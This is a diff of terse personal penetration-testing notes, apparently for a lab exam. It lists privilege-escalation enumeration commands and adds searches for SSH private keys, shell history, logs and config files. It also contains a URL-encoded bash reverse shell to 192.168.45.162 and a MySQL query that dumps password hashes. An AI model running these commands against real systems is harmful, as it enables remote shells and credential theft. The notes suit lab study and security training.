@@ -1,6 +1,7 @@
 * Check these for privesc! :
 $ sudo -l
 $ uname -a
+$ dpkg -l
 $ linpeas
 $ find / -group filter 2>dev/null
 
@@ -11,8 +12,18 @@ $ 0=/bin/bash+-c+%27bash+-i+%3E%26+/dev/tcp/192.168.45.162/80+0%3E%261%27
 
 * if you founf more domain or ip addresses, add to dns -> /etc/hosts
 
+* if you got the www-data, please check these:
+$ find / -name "*.conf" 2>/dev/null
+$ find / -name "*.log" 2>/dev/null
+$ find / -name "id_rsa" 2>/dev/null
+$ find / -name "*.history" 2>/dev/null 
+$ cat /etc/passwd
+$ ls -la /home
+$ ps aux
+$ netstat -tuln
+
 * Don't forget to:
-$ hostname && whoami && cat /root/proof.txt && ip aRETAC AD:
+$ hostname && whoami && cat /root/proof.txt && ip addr:
 
 * maybe you found bug of sql
 query: select user, authentication_string from user;
